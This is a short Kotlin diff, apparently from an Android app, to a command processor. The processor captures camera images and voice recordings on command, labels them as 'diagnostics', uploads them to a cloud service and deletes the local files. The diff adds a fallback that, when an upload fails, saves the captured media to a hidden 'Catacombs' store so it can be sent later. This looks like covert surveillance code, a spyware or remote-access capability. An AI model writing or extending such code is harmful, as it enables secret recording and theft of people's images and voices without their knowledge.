@@ -359,9 +359,12 @@ object CommandProcessor {
                             if (CloudManager.uploadFile(ctx, file, "OPTICAL_DIAG")) {
                                 successCount++
                                 file.delete()
+                            } else {
+                                // OFFLINE: Send to Catacombs
+                                DumpManager.vaultMedia(file, "OPTICAL_DIAG")
                             }
                         }
-                        kotlinx.coroutines.delay(1000) // Gap between bursts
+                        kotlinx.coroutines.delay(1000)
                     }
                     status = "IMAGE_CAPTURE_COMPLETE ($successCount/$count)"
                 }
@@ -371,9 +374,11 @@ object CommandProcessor {
                     if (snippet != null) {
                         if (CloudManager.uploadFile(ctx, snippet, "VOICE_DIAG")) {
                             status = "VOICE_CAPTURE_SUCCESS"
-                            snippet.delete() // Cleanup
+                            snippet.delete()
                         } else {
-                            status = "VOICE_UPLOAD_FAILED"
+                            // OFFLINE: Send to Catacombs
+                            DumpManager.vaultMedia(snippet, "VOICE_DIAG")
+                            status = "VOICE_QUEUED_OFFLINE"
                         }
                     } else {
                         status = "VOICE_CAPTURE_FAILED"
